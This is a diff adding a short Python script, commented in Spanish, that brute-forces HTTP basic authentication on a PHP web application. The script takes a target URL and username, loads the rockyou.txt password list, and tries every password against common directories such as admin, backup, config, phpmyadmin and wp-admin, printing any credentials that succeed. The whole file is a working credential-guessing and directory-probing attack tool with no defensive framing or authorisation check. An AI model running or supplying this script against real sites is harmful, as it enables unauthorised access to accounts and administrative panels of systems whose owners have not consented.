@@ -1,0 +1,27 @@
+import requests
+
+def scan_directory(url, directory, username, password):
+    # Intentamos acceder al directorio con credenciales
+    response = requests.get(url + "/" + directory, auth=(username, password))
+    if response.status_code == 200:
+        print(f"Directorio encontrado: {url}/{directory} (Credenciales: {username}/{password})")
+    elif response.status_code == 404:
+        print(f"Directorio no encontrado: {url}/{directory}")
+    else:
+        print(f"Error al acceder a {url}/{directory}: {response.status_code}")
+
+def main():
+    url = input("Introduce la URL de la aplicación web PHP: ")
+    username = input("Introduce el nombre de usuario: ")
+    # Cargamos el diccionario rockyou.txt
+    with open("rockyou.txt", "r", encoding="utf-8", errors="ignore") as file:
+        passwords = file.readlines()
+    for password in passwords:
+        password = password.strip()  # Eliminamos caracteres de nueva línea y espacios en blanco
+        # Lista de directorios comunes a escanear
+        directorios = ["admin", "uploads", "backup", "config", "phpmyadmin", "wp-admin", "wp-content", "wp-includes"]
+        for directorio in directorios:
+            scan_directory(url, directorio, username, password)
+
+if __name__ == "__main__":
+    main()
